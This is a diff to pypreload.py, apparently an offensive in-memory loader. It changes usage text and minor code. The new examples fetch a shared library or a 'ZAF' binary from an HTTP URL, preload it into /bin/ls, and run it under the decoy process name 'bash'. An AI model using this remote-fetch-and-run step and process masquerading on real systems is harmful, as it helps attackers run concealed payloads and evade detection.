@@ -168,8 +168,16 @@ def usage(err_str=""):
                 -d: (O) decoy process name
                 -c: (O) command to preload
 
-    Example:./pypreload.py  -t so -l http://127.0.0.1:8080/libmctor.so -c /bin/ls  -- -l /tmp/a
-    Note: need `--` before OS command arguments if the arguments contain pypreload flags (e.g. -l), for now
+    Example:
+
+    Load shared library, into /bin/ls  
+        $./pypreload.py  -t so -l http://127.0.0.1:8080/libmctor.so -c /bin/ls  -- -l /tmp/a
+    Note: need `--` before OS command arguments if the arguments contain pypreload flags (e.g. -l)
+
+    Load ZAF binary, decoy as `bash`
+        $./pypreload.py -t bin -l http://127.0.0.1:8080/zaf -d  bash
+
+
 
     """ % (err_str,sys.argv[0])
     )
@@ -182,6 +190,7 @@ def setDname(dname, dpath):
 
     try:
        import setproctitle
+       print("Setproctitile setting to ", dname)
        setproctitle.setproctitle(dname)
     except ImportError as e:
        print("Setproctitile not loaded", e)
@@ -197,7 +206,7 @@ def main():
     ptype     = None
     plocation = None
     dname     = None
-    dpath     = "../ext" # where setproctitile.so module is located
+    dpath     = "." # where setproctitile.so module is located
     ocmd      = None
 
     for o, a in opts:
@@ -212,7 +221,7 @@ def main():
             ptype = a
         elif o in ("-d", "--dname"):
             setDname(a, dpath)
-            print("Decoy Process name: ", dname)
+            print("Decoy Process name: ", a)
         elif o in ("-c", "--comm"):
             ocmd = a
             print("Command: ", ocmd)
